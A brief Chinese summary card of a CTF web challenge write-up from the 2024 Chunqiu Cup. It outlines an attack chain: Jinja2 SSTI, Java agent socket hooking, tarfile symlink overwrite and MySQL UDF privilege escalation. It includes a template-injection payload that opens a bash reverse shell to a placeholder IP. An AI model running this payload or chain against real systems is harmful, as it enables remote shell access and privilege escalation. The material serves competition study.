---
title: "【WP】2024年春秋杯夏季赛 brother 出题思路详解"
category: web
tags: ["春秋杯", "web", "SSTI-rebound-shell", "sql-proxy.jar-tcp-forward", "Java-agent-attach", "send-method-hook"]
signals: ["春秋杯 2024", "SSTI-rebound-shell", "sql-proxy.jar-tcp-forward", "Java-agent-attach", "send-method-hook", "evil.key-read", "MySQL-UDF-privesc", "tarfile-symlink-overwrite", "ssti", "brother", "SSTI", "shell", "sql-proxy", "jar"]
difficulty: hard
source: "https://www.ctfiot.com/195033.html"
tools: ["Java", "Jinja2", "Python"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 【WP】2024年春秋杯夏季赛 brother 出题思路详解

> 赛事：春秋杯 2024 | 方向：web | 难度：hard | 工具：Java、Jinja2、Python

## 一句话总结

2024 春秋杯夏季赛 brother 出题思路，SSTI 反弹 shell + sql-proxy.jar Java agent hook send + MySQL UDF 提权。

## 攻击链

1. 1. SSTI Jinja2 {{lipsum.__globals__['os'].popen('bash -i >& /dev/tcp/IP/6666')}} 反弹 shell/2. sql-proxy.jar 6666→3306 流量转发 + Java agent 劫持 socket send 方法读 /app/evil.key/3. update.py code=1 接收 tar.gz 解压 new.bin 到 /updatedir/4. tarfile 软链接覆盖写入 MySQL 插件目录 + UDF 提权

## 关键 payload

```
SQL proxy: sourcePort=6666 destPort=3306  UDF so: /app/evil.key  tarfile 软链接覆盖
```

## 经验教训

sql-proxy.jar 用 Base64ClassLoader 动态加载类，Java agent 可劫持 socket send 改响应；tarfile 解压未限制软链接是覆盖写入漏洞；MySQL UDF 提权需要 plugin_dir 写入权限。

## 标签

SSTI-rebound-shell、sql-proxy.jar-tcp-forward、Java-agent-attach、send-method-hook、evil.key-read、MySQL-UDF-privesc、tarfile-symlink-overwrite

## 参考来源

- https://www.ctfiot.com/195033.html
- 原文件：【WP】2024年春秋杯夏季赛“brother”出题思路详解.full.md
